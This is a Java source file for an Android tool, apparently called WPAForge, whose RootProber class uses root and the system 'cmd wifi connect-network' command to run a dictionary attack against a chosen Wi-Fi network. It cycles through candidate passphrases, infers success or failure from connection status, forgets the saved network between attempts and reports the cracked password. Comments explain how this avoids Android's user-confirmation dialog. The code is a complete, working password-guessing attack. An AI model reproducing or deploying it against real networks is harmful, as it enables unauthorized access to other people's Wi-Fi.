package io.github.wlmosv_png.wpaforge.audit;

import io.github.wlmosv_png.wpaforge.L;

import android.content.Context;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import io.github.wlmosv_png.wpaforge.core.NetRecord;

/**
 * Root 模式连接器。通过 su 调用系统自带的 `cmd wifi` 命令驱动 WiFi 连接。
 *
 * 为什么需要 root：
 *   Android 10+ 的 WifiNetworkSpecifier 会强制弹出系统确认框，普通应用无法静默连接，
 *   所以那条路做不了字典遍历。而 `cmd wifi connect-network` 是 shell 权限的命令，
 *   root 可以调用，不弹窗、能拿真实结果。
 *
 * 实测行为（本机验证）：
 *   正确密码 → 约 12 秒后 `Wifi is connected to "<SSID>"`
 *   错误密码 → 约 3 秒后 `Wifi is not connected`
 *
 * 关键细节：连接前必须先 forgetNetwork，否则系统可能复用已保存的旧密码，
 * 造成"不管传什么密码都成功"的假阳性。
 *
 * 取消机制：所有子进程都记录在案，cancel() 会直接杀掉它们，
 * 不用等阻塞调用自然返回。
 */
public final class RootProber {

    public enum Verdict { SUCCESS, AUTH_FAIL, TIMEOUT, ERROR }

    public static final class Attempt {
        public final String candidate;
        public final Verdict verdict;
        public final long elapsedMs;
        public final String detail;
        public Attempt(String candidate, Verdict v, long ms, String detail) {
            this.candidate = candidate;
            this.verdict = v;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
        }
    }

    public interface Listener {
        void onAttemptStart(int index, int total, String candidate);
        void onAttemptResult(Attempt attempt);
        void onProgress(int tested, int total, double rate, long etaMs);
        /**
         * @param outcome NORMAL=跑完 / PAUSED=暂停（可续跑）/ STOPPED=用户停止
         * @param offset  当前进度，续跑时从这里开始
         */
        void onFinished(Outcome outcome, int tested, int offset, String hitPassword);
        void onHit(String ssid, String password);
        void onBlocked(String reason);
    }

    /** 结束原因 */
    public enum Outcome { NORMAL, PAUSED, STOPPED }

    private static final long POLL_MS = 800L;
    private static final long COOLDOWN_MS = 800L;
    private static final String TAG = "WPAForgeRoot";

    private final Context appCtx;
    /** 取消标志。volatile 保证工作线程能立刻看到。 */
    private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
    /** 暂停标志。与取消的区别：暂停后进度保留，可续跑。 */
    private final AtomicBoolean pauseFlag = new AtomicBoolean(false);
    /** 当前正在跑的子进程，cancel 时直接 kill */
    private volatile Process activeProc;

    public RootProber(Context ctx) {
        this.appCtx = ctx.getApplicationContext();
    }

    /** 检查 root 是否可用，返回空串表示可用 */
    public static String checkRoot() {
        try {
            String out = exec(null, new String[]{"su", "-c", "id"}, 8000);
            if (out == null || !out.contains("uid=0")) {
                return L.s("无法获取 root（su 未授权或未安装）", "Cannot get root (su denied or not installed)");
            }
            String wifiCmd = exec(null, new String[]{"su", "-c", "cmd wifi help"}, 8000);
            if (wifiCmd == null || !wifiCmd.contains("connect-network")) {
                return L.s("本机 cmd wifi 不支持 connect-network", "This device's cmd wifi lacks connect-network");
            }
            return "";
        } catch (Exception e) {
            return L.s("检查失败: ", "Check failed: ") + e;
        }
    }

    public boolean isRunning() {
        return !cancelFlag.get() && activeProc != null;
    }

    /**
     * 取消。立刻杀掉正在跑的子进程，主循环下一轮就会退出。
     * 不用等阻塞调用自然超时。
     */
    /** 暂停：保留进度，可续跑。不杀子进程（让它自然结束当前这一条）。 */
    public void pause() {
        pauseFlag.set(true);
    }

    public boolean isPaused() {
        return pauseFlag.get();
    }

    public void cancel() {
        cancelFlag.set(true);
        pauseFlag.set(false);
        Process p = activeProc;
        if (p != null) {
            try {
                // destroyForcibly 会 SIGKILL，避免 su 进程挂住
                p.destroyForcibly();
                android.util.Log.i(TAG, L.s("已强制结束当前子进程", "Killed the current subprocess"));
            } catch (Exception ignored) {}
        }
    }

    /** 从第 0 条开始跑 */
    public void run(NetRecord target, List<Candidate> candidates, Listener l) {
        run(target, candidates, 0, l);
    }

    /**
     * 从指定位置开始跑（断点续跑）。
     *
     * @param startOffset 从第几条开始（0 起）
     */
    public void run(NetRecord target, List<Candidate> candidates, int startOffset, Listener l) {
        String rootIssue = checkRoot();
        if (!rootIssue.isEmpty()) {
            l.onBlocked(rootIssue);
            return;
        }
        if (target == null || target.ssid.isEmpty()) {
            l.onBlocked(L.s("目标网络信息不完整", "Incomplete target network info"));
            return;
        }
        if (candidates == null || candidates.isEmpty()) {
            l.onBlocked(L.s("候选字典为空", "Candidate dictionary is empty"));
            return;
        }

        cancelFlag.set(false);
        pauseFlag.set(false);
        int total = candidates.size();
        int startIdx = Math.max(0, Math.min(startOffset, total));
        int tested = 0;                       // 本轮试了多少条
        int cursor = startIdx;                // 绝对位置
        long start = System.currentTimeMillis();
        String sec = securityArg(target);

        try {
            forgetTarget(target);

            for (int i = startIdx; i < total; i++) {
                if (cancelFlag.get() || pauseFlag.get()) break;
                Candidate c = candidates.get(i);
                tested++;
                cursor = i + 1;               // 处理完这条，进度推进到这里
                l.onAttemptStart(cursor, total, c.password);

                long t0 = System.currentTimeMillis();
                Attempt a = tryOne(target, sec, c.password);
                long dt = System.currentTimeMillis() - t0;

                l.onAttemptResult(new Attempt(c.password, a.verdict, dt, a.detail));

                if (a.verdict == Verdict.SUCCESS) {
                    l.onHit(target.displayName(), c.password);
                    l.onFinished(Outcome.NORMAL, tested, cursor, c.password);
                    return;
                }

                double rate = tested / Math.max(0.001, (System.currentTimeMillis() - start) / 1000.0);
                long eta = rate > 0 ? (long) ((total - cursor) / rate * 1000) : -1;
                l.onProgress(cursor, total, rate, eta);

                if (cancelFlag.get() || pauseFlag.get()) break;

                forgetTarget(target);
                interruptibleSleep(COOLDOWN_MS);
            }
        } finally {
            activeProc = null;
            Outcome oc = cancelFlag.get() ? Outcome.STOPPED
                    : pauseFlag.get() ? Outcome.PAUSED
                    : Outcome.NORMAL;
            l.onFinished(oc, tested, cursor, null);
        }
    }

    private Attempt tryOne(NetRecord target, String sec, String password) {
        long t0 = System.currentTimeMillis();

        // 命令异步发出，立刻返回。轮询期间持续检查取消标志。
        // su -c 里加了 timeout，防止 connect-network 自己挂太久。
        String cmd = "timeout 20 cmd wifi connect-network "
                + shellQuote(target.ssid) + " " + sec + " " + shellQuote(password);
        execAsync(new String[]{"su", "-c", cmd});

        // 正确密码约 12 秒能连上；错误密码约 3 秒进入未连接。
        // 最长等 16 秒，超过就当超时（避免阻塞太久）。
        long deadline = System.currentTimeMillis() + 16_000L;
        while (System.currentTimeMillis() < deadline) {
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.TIMEOUT,
                        System.currentTimeMillis() - t0, L.s("已中断", "Interrupted"));
            }
            interruptibleSleep(POLL_MS);
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.TIMEOUT,
                        System.currentTimeMillis() - t0, L.s("已中断", "Interrupted"));
            }
            String st = status();
            if (st == null) continue;

            if (isConnectedTo(st, target.ssid)) {
                return new Attempt(password, Verdict.SUCCESS,
                        System.currentTimeMillis() - t0, L.s("已连上", "Connected"));
            }
            if (st.contains("not connected")) {
                return new Attempt(password, Verdict.AUTH_FAIL,
                        System.currentTimeMillis() - t0, L.s("密码错误", "Wrong passphrase"));
            }
        }
        return new Attempt(password, Verdict.TIMEOUT,
                System.currentTimeMillis() - t0, L.s("超时", "Timeout"));
    }

    private String status() {
        return exec(this, new String[]{"su", "-c", "cmd wifi status"}, 6000);
    }

    private static boolean isConnectedTo(String status, String ssid) {
        if (status == null) return false;
        return status.contains("connected to \"" + ssid + "\"");
    }

    /** 删除目标网络的已保存配置，用 netId 精确定位 */
    private void forgetTarget(NetRecord target) {
        if (cancelFlag.get()) return;
        try {
            String list = exec(this, new String[]{"su", "-c", "cmd wifi list-networks"}, 6000);
            if (list == null) return;
            for (String line : list.split("\n")) {
                String t = line.trim();
                if (!t.matches("^\\d+\\s+.*")) continue;
                String[] parts = t.split("\\s+");
                if (parts.length < 3) continue;
                String netId = parts[0];
                String ssid = parts[1];
                if (!ssid.equals(target.ssid)) continue;
                exec(this, new String[]{"su", "-c",
                        "cmd wifi forget-network " + netId}, 6000);
                android.util.Log.i(TAG, "forget " + ssid + " netId=" + netId);
            }
        } catch (Exception e) {
            android.util.Log.w(TAG, L.s("forgetTarget 失败: ", "forgetTarget failed: ") + e);
        }
    }

    private static String securityArg(NetRecord t) {
        switch (t.security) {
            case OPEN: return "open";
            case OWE: return "owe";
            case WEP: return "wep";
            case WPA3: return "wpa3";
            default: return "wpa2";
        }
    }

    private static String shellQuote(String s) {
        if (s == null) return "''";
        return "'" + s.replace("'", "'\\''") + "'";
    }

    /** 可被打断的等待：每 100ms 检查一次取消标志 */
    private void interruptibleSleep(long ms) {
        long end = System.currentTimeMillis() + ms;
        while (System.currentTimeMillis() < end) {
            if (cancelFlag.get() || pauseFlag.get()) return;
            try {
                Thread.sleep(Math.min(100, Math.max(1, end - System.currentTimeMillis())));
            } catch (InterruptedException e) {
                return;
            }
        }
    }

    /** 异步跑一个进程，不读输出。用于发命令 */
    private void execAsync(String[] cmd) {
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            activeProc = p;
            // 输出丢弃，但必须在另一个线程消费，否则缓冲区满了会阻塞
            new Thread(() -> {
                try (BufferedReader r = new BufferedReader(
                        new InputStreamReader(p.getInputStream()))) {
                    while (r.readLine() != null) { /* 丢弃 */ }
                } catch (Exception ignored) {}
            }, "wpaforge-drain").start();
        } catch (Exception e) {
            android.util.Log.w(TAG, L.s("execAsync 失败: ", "execAsync failed: ") + e);
        }
    }

    /** 同步执行并拿 stdout，超时可中断 */
    public static String exec(Object ctx, String[] cmd, long timeoutMs) {
        Process p = null;
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            p = pb.start();
            final Process fp = p;
            // 超时后强杀，避免挂住
            Thread killer = new Thread(() -> {
                try {
                    if (!fp.waitFor(timeoutMs, TimeUnit.MILLISECONDS)) {
                        fp.destroyForcibly();
                    }
                } catch (Exception ignored) {}
            });
            killer.setDaemon(true);
            killer.start();

            StringBuilder sb = new StringBuilder();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = r.readLine()) != null) sb.append(line).append('\n');
            }
            p.waitFor(500, TimeUnit.MILLISECONDS);
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            if (p != null) {
                try { p.destroy(); } catch (Exception ignored) {}
            }
        }
    }
}
